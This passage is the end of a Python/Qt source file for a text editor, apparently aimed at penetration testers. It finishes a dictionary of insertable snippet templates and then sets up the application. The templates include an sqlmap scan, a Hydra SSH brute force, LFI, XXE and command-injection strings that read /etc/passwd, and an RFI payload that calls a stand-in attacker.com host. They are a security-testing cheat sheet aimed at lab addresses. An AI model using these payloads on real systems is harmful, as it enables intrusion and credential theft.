            "SQLMAP BASIC": '''sqlmap -u "http://10.10.10.10/page.php?id=1" --batch --dbs''',
            
            "CURL POST REQUEST": '''curl -X POST http://10.10.10.10/login -d "username=admin&password=password"''',
            
            "LFI PAYLOAD": '''../../../etc/passwd''',
            
            "RFI PAYLOAD": '''http://attacker.com/shell.txt?''',
            
            "XXE INJECTION": '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<root>&test;</root>''',
            
            "COMMAND INJECTION": '''; cat /etc/passwd #''',
            
            "SMBCLIENT CONNECT": '''smbclient //10.10.10.10/share -U username''',
            
            "HYDRA SSH BRUTE": '''hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10''',
        }
    
    def insert_template(self, code):
        """Insert template into parent editor"""
        if self.parent_editor:
            current_editor = self.parent_editor.current_editor()
            if current_editor:
                current_editor.insertPlainText("\n" + code + "\n")
        self.close()

def main():
    # Set environment variables for HiDPI scaling BEFORE creating the application
    import os
    os.environ["QT_ENABLE_HIGHDPI_SCALING"] = "1"
    os.environ["QT_SCALE_FACTOR"] = "1"
    os.environ["QT_AUTO_SCREEN_SCALE_FACTOR"] = "1"
    
    app = QApplication(sys.argv)
    
    # HiDPI handling
    try:
        app.setHighDpiScaleFactorRoundingPolicy(
            Qt.HighDpiScaleFactorRoundingPolicy.PassThrough
        )
        if hasattr(Qt.ApplicationAttribute, 'AA_EnableHighDpiScaling'):
            app.setAttribute(Qt.ApplicationAttribute.AA_EnableHighDpiScaling, True)
        if hasattr(Qt.ApplicationAttribute, 'AA_UseHighDpiPixmaps'):
            app.setAttribute(Qt.ApplicationAttribute.AA_UseHighDpiPixmaps, True)
    except AttributeError:
        print("Note: Using environment variables for HiDPI scaling")
    
    # Create and show window
    window = LeviathanEditUltimate()
    window.show()
    
    sys.exit(app.exec())

if __name__ == "__main__":
    main()